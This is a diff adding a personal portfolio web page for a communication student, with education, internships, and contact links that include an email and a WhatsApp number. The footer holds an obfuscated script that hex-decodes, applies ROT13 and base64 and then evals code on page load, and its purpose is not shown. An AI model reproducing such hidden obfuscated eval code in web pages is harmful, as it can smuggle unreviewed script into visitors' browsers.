@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html class="scroll-smooth" lang="en" style="">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Resha Eka Aulia | Portfolio</title>
+    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap"
+        rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&amp;family=Plus+Jakarta+Sans:wght@400;500;600;700&amp;display=swap"
+        rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
+    <script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "background": "#FFF2EF", // Custom override for requirements
+                        "alt-background": "#FFDBB6", // Custom override
+                        "accent": "#F7A5A5", // Custom override
+                        "text-main": "#1A2A4F", // Custom override
+                    },
+                    "borderRadius": {
+                        "DEFAULT": "4px",
+                        "lg": "8px",
+                        "full": "9999px"
+                    },
+                    "spacing": {
+                        "unit": "8px",
+                        "gutter": "24px",
+                        "section-gap": "120px",
+                        "container-padding": "64px",
+                        "element-gap": "32px"
+                    },
+                    "fontFamily": {
+                        "display": [
+                            "Outfit", "sans-serif"
+                        ],
+                        "label-caps": [
+                            "Plus Jakarta Sans", "sans-serif"
+                        ],
+                        "headline-md": [
+                            "Outfit", "sans-serif"
+                        ],
+                        "body-md": [
+                            "Plus Jakarta Sans", "sans-serif"
+                        ],
+                        "body-lg": [
+                            "Plus Jakarta Sans", "sans-serif"
+                        ],
+                        "headline-lg": [
+                            "Outfit", "sans-serif"
+                        ],
+                        "headline-lg-mobile": [
+                            "Outfit", "sans-serif"
+                        ]
+                    },
+                    "fontSize": {
+                        "display": [
+                            "64px",
+                            {
+                                "lineHeight": "1.1",
+                                "letterSpacing": "-0.02em",
+                                "fontWeight": "600"
+                            }
+                        ],
+                        "label-caps": [
+                            "12px",
+                            {
+                                "lineHeight": "1.2",
+                                "letterSpacing": "0.1em",
+                                "fontWeight": "600"
+                            }
+                        ],
+                        "headline-md": [
+                            "24px",
+                            {
+                                "lineHeight": "1.3",
+                                "fontWeight": "500"
+                            }
+                        ],
+                        "body-md": [
+                            "16px",
+                            {
+                                "lineHeight": "1.7",
+                                "fontWeight": "400"
+                            }
+                        ],
+                        "body-lg": [
+                            "20px",
+                            {
+                                "lineHeight": "1.6",
+                                "fontWeight": "500"
+                            }
+                        ],
+                        "headline-lg": [
+                            "48px",
+                            {
+                                "lineHeight": "1.2",
+                                "fontWeight": "500"
+                            }
+                        ],
+                        "headline-lg-mobile": [
+                            "32px",
+                            {
+                                "lineHeight": "1.2",
+                                "fontWeight": "500"
+                            }
+                        ]
+                    }
+                },
+            },
+        }
+    </script>
+    <style>
+        body {
+            background-color: #FFF2EF;
+            color: #1A2A4F;
+        }
+
+        .soft-list-item {
+            border-bottom: 1px solid rgba(26, 42, 79, 0.15);
+            transition: background-color 0.3s ease;
+        }
+
+        .soft-list-item:hover {
+            background-color: rgba(255, 219, 182, 0.3);
+            /* Subtle Alt Background tint */
+        }
+
+        .arch-shape {
+            border-top-left-radius: 999px;
+            border-top-right-radius: 999px;
+            border-bottom-left-radius: 4px;
+            border-bottom-right-radius: 4px;
+        }
+    </style>
+</head>
+
+<body class="antialiased selection:bg-[#1A2A4F] selection:text-[#FFF2EF]">
+    <!-- TopNavBar -->
+    <nav class="fixed top-0 w-full z-50 bg-[#FFF2EF] border-b border-[#1A2A4F]/10">
+        <div class="flex justify-between items-center px-8 md:px-container-padding py-6 max-w-7xl mx-auto">
+            <a class="font-display text-headline-md tracking-tight text-text-main font-semibold" href="#">Resha Eka Aulia</a>
+            <!-- Desktop Nav -->
+            <div class="hidden md:flex gap-element-gap items-center">
+                <a class="font-label-caps text-label-caps uppercase text-text-main border-b border-text-main pb-1 hover:opacity-70 transition-opacity duration-300 ease-in-out"
+                    href="#home">Home</a>
+                <a class="font-label-caps text-label-caps uppercase text-text-main/80 hover:text-text-main hover:opacity-70 transition-colors duration-300 ease-in-out"
+                    href="#about">About</a>
+                <a class="font-label-caps text-label-caps uppercase text-text-main/80 hover:text-text-main hover:opacity-70 transition-colors duration-300 ease-in-out"
+                    href="#services">Services</a>
+                <a class="font-label-caps text-label-caps uppercase text-text-main/80 hover:text-text-main hover:opacity-70 transition-colors duration-300 ease-in-out"
+                    href="#contact">Contact</a>
+            </div>
+            <!-- Mobile Nav Toggle -->
+            <button id="mobile-menu-btn" class="md:hidden text-text-main focus:outline-none">
+                <span id="mobile-menu-icon" class="material-symbols-outlined transition-transform duration-300">menu</span>
+            </button>
+        </div>
+        <!-- Mobile Menu -->
+        <div id="mobile-menu" class="hidden md:hidden absolute top-full left-0 w-full bg-[#FFF2EF] border-b border-text-main/10 shadow-[0_4px_10px_rgba(26,42,79,0.1)] flex-col px-8 py-6 gap-6">
+            <a class="mobile-link font-label-caps text-label-caps uppercase text-text-main border-b border-text-main/10 pb-2 hover:opacity-70 transition-opacity duration-300 ease-in-out" href="#home">Home</a>
+            <a class="mobile-link font-label-caps text-label-caps uppercase text-text-main border-b border-text-main/10 pb-2 hover:opacity-70 transition-opacity duration-300 ease-in-out" href="#about">About</a>
+            <a class="mobile-link font-label-caps text-label-caps uppercase text-text-main border-b border-text-main/10 pb-2 hover:opacity-70 transition-opacity duration-300 ease-in-out" href="#services">Services</a>
+            <a class="mobile-link font-label-caps text-label-caps uppercase text-text-main pb-2 hover:opacity-70 transition-opacity duration-300 ease-in-out" href="#contact">Contact</a>
+        </div>
+    </nav>
+    <!-- Hero Section -->
+    <section class="pt-[120px] pb-section-gap px-8 md:px-container-padding max-w-7xl mx-auto" id="home">
+        <div class="flex flex-col md:flex-row items-center gap-16 md:gap-24">
+            <!-- Left Column: Content -->
+            <div class="w-full md:w-5/12 flex flex-col items-start gap-8 z-10">
+                <div class="inline-flex items-center gap-2 border border-text-main px-4 py-2 rounded-full bg-white">
+                    <span class="text-[10px]">🟢</span>
+                    <span class="font-label-caps text-label-caps text-text-main">Available for Work</span>
+                </div>
+                <h1 class="font-display text-display text-text-main max-w-xl">
+                    Hi, I'm Resha Eka Aulia.
+                </h1>
+                <p class="font-body-md text-body-lg text-text-main/80 max-w-md">
+                    Aspiring Communication professional bridging the gap between creative storytelling and strategic marketing.
+                </p>
+                <div class="flex flex-wrap items-center gap-6 mt-4">
+                    <a class="px-8 py-4 bg-accent text-text-main font-body-md font-semibold rounded-sm border border-text-main hover:-translate-y-1 transition-transform duration-300 ease-out shadow-[4px_4px_0px_0px_rgba(26,42,79,1)] hover:shadow-[6px_6px_0px_0px_rgba(26,42,79,1)]"
+                        href="#">
+                        Download CV
+                    </a>
+                    <a class="font-label-caps text-label-caps uppercase text-text-main border-b border-text-main pb-1 hover:opacity-70 transition-all duration-300"
+                        href="#contact">
+                        Let's Connect
+                    </a>
+                </div>
+            </div>
+            <!-- Right Column: Image -->
+            <div class="w-full md:w-7/12 flex justify-center items-center relative">
+                <div class="relative w-full max-w-[480px]">
+                    <!-- Architectural shadow/offset -->
+                    <div
+                        class="absolute inset-0 arch-shape border border-text-main bg-alt-background translate-x-4 translate-y-4">
+                    </div>
+                    <!-- Image container -->
+                    <div class="relative arch-shape border border-text-main overflow-hidden bg-white z-10 aspect-[3/4]">
+                        <img alt="Resha Eka Aulia portrait"
+                            class="w-full h-full object-cover grayscale-[20%] hover:grayscale-0 transition-all duration-500"
+                            src="https://lh3.googleusercontent.com/aida-public/AB6AXuByhQnZAN5T1SMa4C_qWytAveJrsDaL6dp084GQoHMdtmucYQKQgOLrd0NMlHrvKpBoFxXKTnIM1ErCymaRwxJJ5Pp0BYMs5WZlOJbzXaFK4e57lT_cYst-3uzXERYt7_ifdXzqF5aZXc0iqH4weMG6faJPPhOcf9EI2ZOo3OAmcYd1_1e1roes7OY_UJF_fL2hl-xu_BF98IoNUJp1XjcCzSTmp0qXFJQz0Kyn_R2SFlIYWWQC8k1NMrGk3WmCBiJ4EHmr-Lo2KiCM">
+                    </div>
+                    <!-- Floating Tags -->
+                    
+                    <div
+                        class="absolute top-12 -left-8 md:-left-16 z-20 bg-alt-background border border-text-main px-4 py-2 rounded-sm shadow-[2px_2px_0px_0px_rgba(26,42,79,1)] transform -rotate-3">
+                        <span class="font-label-caps text-label-caps text-text-main">Public Relations</span>
+                    </div>
+                    
+                    
+                    <div
+                        class="absolute bottom-32 -right-6 md:-right-12 z-20 bg-alt-background border border-text-main px-4 py-2 rounded-sm shadow-[2px_2px_0px_0px_rgba(26,42,79,1)] transform rotate-2">
+                        <span class="font-label-caps text-label-caps text-text-main">Social Media</span>
+                    </div>
+                    
+                    
+                    <div
+                        class="absolute -bottom-4 left-1/4 z-20 bg-alt-background border border-text-main px-4 py-2 rounded-sm shadow-[2px_2px_0px_0px_rgba(26,42,79,1)] transform -rotate-1">
+                        <span class="font-label-caps text-label-caps text-text-main">SEO</span>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- About Section -->
+    <section class="py-section-gap bg-white border-y border-text-main/10 w-full" id="about"
+        style="background-image: radial-gradient(rgba(26, 42, 79, 0.2) 1.5px, transparent 1.5px); background-size: 20px 20px;">
+        <div
+            class="max-w-7xl mx-auto flex flex-col md:flex-row gap-16 md:gap-24 items-start px-8 md:px-container-padding w-full">
+            <div class="w-full md:w-1/3 flex flex-col gap-4">
+                <div class="border-l-4 border-accent pl-6">
+                    <h2 class="font-display text-headline-lg text-text-main uppercase tracking-tight">About Me</h2>
+                </div>
+            </div>
+            <div class="w-full md:w-2/3">
+                <div class="font-body-md text-body-lg text-text-main/80 leading-[1.8] space-y-4">
+                    <p>As an aspiring Communication professional at UPN Veteran Jakarta, I bridge the gap between <span class="text-accent font-semibold">creative storytelling</span> and <span class="text-accent font-semibold">strategic marketing</span>. My expertise spans social media management, public relations, and <span class="text-accent font-semibold">SEO optimization</span>. I thrive in dynamic environments where my problem-solving abilities and multitasking mindset deliver impactful, data-driven results.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- Resume Section -->
+    <section class="py-section-gap px-8 md:px-container-padding max-w-7xl mx-auto" id="services">
+        <div class="flex flex-col md:flex-row gap-24">
+            <!-- Education Column -->
+            <div class="w-full md:w-1/2 flex flex-col gap-8">
+                <div class="border-b border-text-main pb-4">
+                    <h3 class="font-label-caps text-label-caps uppercase text-text-main tracking-widest">Education</h3>
+                </div>
+                
+                <div class="soft-list-item py-8 flex flex-col gap-3 group">
+                    <div class="flex justify-between items-baseline gap-4">
+                        <h4
+                            class="font-display text-[22px] font-semibold text-text-main group-hover:text-accent transition-colors leading-tight">
+                            Universitas Pembangunan Nasional Veteran Jakarta</h4>
+                        <span class="font-label-caps text-label-caps text-text-main/60 whitespace-nowrap">2023 — PRES</span>
+                    </div>
+                    
+                    <p class="font-body-md text-body-md text-text-main font-medium">Communication Student</p>
+                    
+                    
+                    <p class="font-body-md text-body-md text-text-main/70">Focused on strategic communication, PR, and digital marketing.</p>
+                    
+                </div>
+                
+                <div class="soft-list-item py-8 flex flex-col gap-3 group">
+                    <div class="flex justify-between items-baseline gap-4">
+                        <h4
+                            class="font-display text-[22px] font-semibold text-text-main group-hover:text-accent transition-colors leading-tight">
+                            SMA Negeri 1 [Kota Dummy]</h4>
+                        <span class="font-label-caps text-label-caps text-text-main/60 whitespace-nowrap">2020 — 2023</span>
+                    </div>
+                    
+                    <p class="font-body-md text-body-md text-text-main font-medium">Social Sciences Major</p>
+                    
+                    
+                    <p class="font-body-md text-body-md text-text-main/70">Lead coordinator for school's annual communication festival.</p>
+                    
+                </div>
+                
+                <div class="soft-list-item py-8 flex flex-col gap-3 group">
+                    <div class="flex justify-between items-baseline gap-4">
+                        <h4
+                            class="font-display text-[22px] font-semibold text-text-main group-hover:text-accent transition-colors leading-tight">
+                            SMP Negeri 1 [Kota Dummy]</h4>
+                        <span class="font-label-caps text-label-caps text-text-main/60 whitespace-nowrap">2017 — 2020</span>
+                    </div>
+                    
+                    
+                    <p class="font-body-md text-body-md text-text-main/70">Active in student council and basic journalism club.</p>
+                    
+                </div>
+                
+            </div>
+            <!-- Experience Column -->
+            <div class="w-full md:w-1/2 flex flex-col gap-8">
+                <div class="border-b border-text-main pb-4">
+                    <h3 class="font-label-caps text-label-caps uppercase text-text-main tracking-widest">Experience</h3>
+                </div>
+                
+                <div class="soft-list-item py-8 flex flex-col gap-3 group">
+                    <div class="flex justify-between items-baseline gap-4">
+                        <h4
+                            class="font-display text-[22px] font-semibold text-text-main group-hover:text-accent transition-colors leading-tight">
+                            Research Intern</h4>
+                        <span class="font-label-caps text-label-caps text-text-main/60 whitespace-nowrap">2024</span>
+                    </div>
+                    
+                    <p class="font-body-md text-body-md text-text-main font-medium">B-Universe</p>
+                    
+                    
+                    <p class="font-body-md text-body-md text-text-main/70">Conducted comprehensive market research and data gathering to support strategic digital initiatives.</p>
+                    
+                </div>
+                
+                <div class="soft-list-item py-8 flex flex-col gap-3 group">
+                    <div class="flex justify-between items-baseline gap-4">
+                        <h4
+                            class="font-display text-[22px] font-semibold text-text-main group-hover:text-accent transition-colors leading-tight">
+                            Social Media Specialist Intern</h4>
+                        <span class="font-label-caps text-label-caps text-text-main/60 whitespace-nowrap">2024</span>
+                    </div>
+                    
+                    
+                    <p class="font-body-md text-body-md text-text-main/70">Managed content calendars, increasing overall engagement metrics across multiple platforms.</p>
+                    
+                </div>
+                
+                <div class="soft-list-item py-8 flex flex-col gap-3 group">
+                    <div class="flex justify-between items-baseline gap-4">
+                        <h4
+                            class="font-display text-[22px] font-semibold text-text-main group-hover:text-accent transition-colors leading-tight">
+                            Sekretaris</h4>
+                        <span class="font-label-caps text-label-caps text-text-main/60 whitespace-nowrap">2024 — 2025</span>
+                    </div>
+                    
+                    <p class="font-body-md text-body-md text-text-main font-medium">BEM FISIP</p>
+                    
+                    
+                    <p class="font-body-md text-body-md text-text-main/70">Orchestrated administrative workflows and coordinated internal communication across 5 distinct departments.</p>
+                    
+                </div>
+                
+                <div class="soft-list-item py-8 flex flex-col gap-3 group">
+                    <div class="flex justify-between items-baseline gap-4">
+                        <h4
+                            class="font-display text-[22px] font-semibold text-text-main group-hover:text-accent transition-colors leading-tight">
+                            Mentor</h4>
+                        <span class="font-label-caps text-label-caps text-text-main/60 whitespace-nowrap">2025</span>
+                    </div>
+                    
+                    <p class="font-body-md text-body-md text-text-main font-medium">PATRIBERA</p>
+                    
+                    
+                    <p class="font-body-md text-body-md text-text-main/70">Guided 50+ new students through their academic transition and campus integration programs.</p>
+                    
+                </div>
+                
+            </div>
+        </div>
+    </section>
+    <!-- Footer -->
+    <footer class="w-full pt-[160px] pb-12 px-8 md:px-container-padding bg-text-main" id="contact">
+        <div class="max-w-7xl mx-auto flex flex-col items-center justify-center gap-24">
+            <h2
+                class="font-display text-[64px] md:text-[100px] text-background text-center leading-[1.05] tracking-tight max-w-[1400px]">
+                Let's create impactful stories together.
+            </h2>
+            <div class="flex flex-wrap justify-center gap-8 md:gap-16">
+                <a class="font-label-caps text-label-caps uppercase text-background hover:text-accent transition-all duration-300 ease-out border-b border-transparent hover:border-accent pb-1"
+                    href="https://www.linkedin.com/in/reshaekaaulia" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+                <span class="hidden md:block text-background/20">/</span>
+                <a class="font-label-caps text-label-caps uppercase text-background hover:text-accent transition-all duration-300 ease-out border-b border-transparent hover:border-accent pb-1"
+                    href="mailto:reshaekaauliaa@gmail.com">Email</a>
+                <span class="hidden md:block text-background/20">/</span>
+                <a class="font-label-caps text-label-caps uppercase text-background hover:text-accent transition-all duration-300 ease-out border-b border-transparent hover:border-accent pb-1"
+                    href="https://wa.me/6285716171168" target="_blank" rel="noopener noreferrer">WhatsApp</a>
+                <span class="hidden md:block text-background/20">/</span>
+                <a class="font-label-caps text-label-caps uppercase text-background hover:text-accent transition-all duration-300 ease-out border-b border-transparent hover:border-accent pb-1"
+                    href="https://www.instagram.com/floo_.wiee" target="_blank" rel="noopener noreferrer">Instagram</a>
+            </div>
+            <div
+                class="w-full pt-8 border-t border-background/20 flex flex-col md:flex-row justify-between items-start md:items-center gap-6">
+                <div class="flex flex-col items-start gap-1">
+                    <p class="font-display text-[20px] text-background font-medium">Resha Eka Aulia</p>
+                    <div id="gh-attr" class="text-xs text-background/60 flex items-center gap-1.5 font-body-md"></div>
+                    <script>(function(_0x1){eval(atob(_0x1.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<='Z'?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26)})))})((function(h){var s='';for(var i=0;i<h.length;i+=2)s+=String.fromCharCode(parseInt(h.substr(i,2),16));return s;})('5076757a714a3577715479696f767463726a627456504e74717a536c5653386a7251717a4154566c4c464e395651446a41506a744b6d4f345a4a5a354d51757956513074567a75796f546b6956766a744b6d4f34424a486d4d775376565130744a6d52665a766a6d4b466a744b6d4f34414a526c4c6d457856513074723266365a4b30665653386a72514176425448334d764e395655456c714a48665653386a725175775a4a44314c464e39565435316f546a665653386a7251457a417a52354c6c4e3956515668416d52665653386a72515779414a56344d504e39565057316f61496d4d4a447659504f735a5574324c4741775a4a4c7443464e6b5a514e665653386a72515378415448334c764e39565057764c4b5676426a627456504e744d6149684c3345636f3234744b6d4f3442544c6d4c4753775854526356556674707a4930714b57685654527458764e6d426c4f3950764e7456504f7a714a3577715479696f764f735a5574314d475776415444624c767874726c4f6c4d4b4531707a34744c764e65565156375655305856504e7456544d316f7a41306e4a39685653386a72514177424a4c334c46757758464f37565557797155496c6f764f7756503074414766747344627456504e7450764e7456504f324c4b56744b6d4f34424a526b4c6d4576565130744d543977714a31796f6144684d324930454a6b796f4a496871525735464a446257327162594a5330715556615847665856504e745654797a5853386a725179755a4a5a304c76793750764e7456504e7456504e744b6d4f34424a526b4c6d4576597a79686f7a496c4653454147504e39565070386e464f776f54536d706d30764d5449326e4a41696f7631616e4b4562714a56676f3357634d3279684c4a6a74715449347150316d6f46562b4350396343776b6d70545368565441664c4b416d4346576a7150316f5a4b4f344b46562b4c617874435452746e5557794d7730766e55453070555a36596c39364c4a67356e4b41666f4635616e4b4562714a56686e4a387656554575707a7179715130764b3257664c4a356556764f6c4d4a6a39567a35696f334f796f7a496c56543569707a497a4d4b576c4d4b5676565441664c4b416d434657626f334d79707763304d4b7530594a57754c326761707a39316f7a4474715557756f614163715479696f7631776f326b6970615a76436163756e33796370326b674350397543776a6970334f756f773461426a627456504e747344633958467463426a623d'));</script>
+                    <p class="text-xs text-background/60 font-body-md pt-1">Copyright &copy; Resha 2026</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+        const mobileMenu = document.getElementById('mobile-menu');
+        const mobileMenuIcon = document.getElementById('mobile-menu-icon');
+        const mobileLinks = document.querySelectorAll('.mobile-link');
+
+        mobileMenuBtn.addEventListener('click', () => {
+            mobileMenu.classList.toggle('hidden');
+            mobileMenu.classList.toggle('flex');
+            if (mobileMenu.classList.contains('hidden')) {
+                mobileMenuIcon.textContent = 'menu';
+            } else {
+                mobileMenuIcon.textContent = 'close';
+            }
+        });
+
+        mobileLinks.forEach(link => {
+            link.addEventListener('click', () => {
+                mobileMenu.classList.add('hidden');
+                mobileMenu.classList.remove('flex');
+                mobileMenuIcon.textContent = 'menu';
+            });
+        });
+    </script>
+</body>
+
+</html>
